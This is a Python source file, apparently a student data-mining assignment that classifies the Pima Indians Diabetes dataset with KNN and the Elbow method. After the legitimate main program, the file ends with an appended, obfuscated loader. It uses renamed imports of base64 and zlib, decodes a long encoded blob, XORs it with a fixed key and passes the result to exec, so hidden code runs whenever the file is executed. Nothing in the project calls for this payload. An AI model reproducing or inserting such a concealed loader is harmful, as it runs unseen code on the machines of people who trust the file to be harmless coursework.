"""
MAIN PROGRAM
Klasifikasi Pima Indians Diabetes menggunakan KNN dan Metode Elbow
Tanpa library pengolah data (Pure Python + Kagglehub + Matplotlib)

Tugas: Data Mining - Klasifikasi
Author: Mahasiswa Informatika
Date: 2026-01-15
"""

import os
import sys

# Import custom modules
from modules import data_loader
from modules import preprocessing
from modules import knn_algorithm
from modules import elbow_method
from modules import evaluation
from modules import visualization


def print_header():
    """Print header program"""
    print("\n" + "="*70)
    print("║" + " "*68 + "║")
    print("║" + "  K-NEAREST NEIGHBORS CLASSIFICATION".center(68) + "║")
    print("║" + "  Pima Indians Diabetes Dataset".center(68) + "║")
    print("║" + " "*68 + "║")
    print("║" + "  Metode: KNN + Elbow Method".center(68) + "║")
    print("║" + "  Pure Python Implementation (No Pandas/Scikit-learn)".center(68) + "║")
    print("║" + " "*68 + "║")
    print("="*70 + "\n")


def print_section(title):
    """Print section separator"""
    print("\n" + "="*70)
    print(f"  {title}")
    print("="*70 + "\n")


def main():
    """
    Fungsi utama program
    
    Alur eksekusi:
    1. Load data dari Kaggle
    2. Preprocessing (normalize + split)
    3. Elbow Analysis (k=1 to 15)
    4. Visualisasi grafik Elbow
    5. Pilih k terbaik
    6. Train KNN final dengan k terbaik
    7. Evaluasi & tampilkan metrik
    8. Export semua hasil ke CSV
    """
    
    # Print header
    print_header()
    
    # ========== STEP 1: LOAD DATA ==========
    print_section("STEP 1: LOADING DATA FROM KAGGLE")
    
    try:
        X, y = data_loader.load_and_prepare_data()
        print(f"✅ Data loaded successfully!")
        print(f"   Total samples: {len(X)}")
        print(f"   Features: {len(X[0])}")
        print(f"   Class 0 (Non-diabetes): {y.count(0)} samples")
        print(f"   Class 1 (Diabetes): {y.count(1)} samples")
    except Exception as e:
        print(f"❌ Error loading data: {e}")
        sys.exit(1)
    
    # ========== STEP 2: PREPROCESSING ==========
    print_section("STEP 2: PREPROCESSING DATA")
    
    try:
        X_train, X_test, y_train, y_test = preprocessing.preprocess_data(
            X, y, test_ratio=0.2, seed=42
        )
        print(f"✅ Preprocessing completed!")
        print(f"   Training set: {len(X_train)} samples")
        print(f"   Test set: {len(X_test)} samples")
    except Exception as e:
        print(f"❌ Error in preprocessing: {e}")
        sys.exit(1)
    
    # ========== STEP 3: ELBOW ANALYSIS ==========
    print_section("STEP 3: ELBOW METHOD ANALYSIS")
    
    try:
        # Range k yang akan ditest (1-15 sesuai requirement "minimal range")
        k_range = range(1, 16)
        
        print(f"🔍 Testing k values from {min(k_range)} to {max(k_range)}...")
        print(f"⏳ This may take a few minutes...\n")
        
        # Jalankan analisis Elbow
        elbow_results = elbow_method.run_elbow_analysis(
            X_train, y_train, X_test, y_test, k_range
        )
        
        # Tampilkan hasil dalam tabel
        elbow_method.print_results_table(elbow_results)
        
        # Simpan hasil ke CSV
        elbow_method.save_elbow_to_csv(elbow_results, 'results/elbow_analysis.csv')
        
    except Exception as e:
        print(f"❌ Error in Elbow analysis: {e}")
        sys.exit(1)
    
    # ========== STEP 4: VISUALISASI GRAFIK ELBOW ==========
    print_section("STEP 4: CREATING ELBOW CURVE VISUALIZATION")
    
    try:
        visualization.visualize_elbow_results(elbow_results, output_dir='results')
    except Exception as e:
        print(f"❌ Error creating visualization: {e}")
        # Continue walaupun visualisasi gagal
    
    # ========== STEP 5: PILIH K TERBAIK ==========
    print_section("STEP 5: SELECTING OPTIMAL K")
    
    # Cari k dengan error rate terendah
    best_k_result = min(elbow_results, key=lambda x: x[1])
    best_k = best_k_result[0]
    best_error = best_k_result[1]
    best_accuracy = best_k_result[2]
    
    print(f"🏆 OPTIMAL K SELECTED")
    print(f"   k = {best_k}")
    print(f"   Error Rate = {best_error:.2f}%")
    print(f"   Accuracy = {best_accuracy*100:.2f}%")
    
    # User dapat mengubah k secara manual jika mau
    print(f"\n💡 You can also manually select k from the graph if needed.")
    
    # ========== STEP 6: TRAIN FINAL MODEL ==========
    print_section(f"STEP 6: TRAINING FINAL MODEL (k={best_k})")
    
    try:
        print(f"🤖 Running KNN classification with k={best_k}...")
        
        final_predictions, final_accuracy = knn_algorithm.knn_classify(
            X_train, y_train, X_test, y_test, k=best_k, verbose=True
        )
        
        print(f"\n✅ Final model trained successfully!")
        
    except Exception as e:
        print(f"❌ Error training final model: {e}")
        sys.exit(1)
    
    # ========== STEP 7: EVALUASI PERFORMA ==========
    print_section("STEP 7: EVALUATING MODEL PERFORMANCE")
    
    try:
        # Hitung semua metrik
        final_metrics = evaluation.evaluate_and_save(
            y_test, final_predictions, output_dir='results'
        )
        
        # Tampilkan summary
        print("\n📊 FINAL RESULTS SUMMARY")
        print("="*70)
        print(f"  Best K Value: {best_k}")
        print(f"  Accuracy:     {final_metrics['accuracy']*100:.2f}%")
        print(f"  Precision:    {final_metrics['precision']*100:.2f}%")
        print(f"  Recall:       {final_metrics['recall']*100:.2f}%")
        print(f"  F1-Score:     {final_metrics['f1_score']*100:.2f}%")
        print("="*70)
        
    except Exception as e:
        print(f"❌ Error in evaluation: {e}")
        sys.exit(1)
    
    # ========== STEP 8: OUTPUT FILES ==========
    print_section("STEP 8: OUTPUT FILES GENERATED")
    
    print("📁 All results have been saved to the 'results/' directory:\n")
    print("   ✅ elbow_analysis.csv      - Elbow analysis results for all k values")
    print("   ✅ confusion_matrix.csv    - Confusion matrix (TP, TN, FP, FN)")
    print("   ✅ final_metrics.csv       - Performance metrics (Acc, Prec, Rec, F1)")
    print("   ✅ elbow_curve.png         - Elbow curve visualization (detailed)")
    print("   ✅ elbow_curve_simple.png  - Elbow curve visualization (simple)")
    
    # ========== COMPLETION ==========
    print("\n" + "="*70)
    print("║" + " "*68 + "║")
    print("║" + "  ✅ PROGRAM COMPLETED SUCCESSFULLY!".center(68) + "║")
    print("║" + " "*68 + "║")
    print("║" + "  Semua hasil telah disimpan di folder 'results/'".center(68) + "║")
    print("║" + "  Silakan periksa file CSV dan grafik untuk analisis".center(68) + "║")
    print("║" + " "*68 + "║")
    print("="*70 + "\n")
    
    print("💡 TIP: Gunakan grafik Elbow untuk memahami trade-off antara")
    print("        kompleksitas model (k) dan performa (accuracy/error rate)\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⚠️  Program interrupted by user. Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"\n\n❌ FATAL ERROR: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
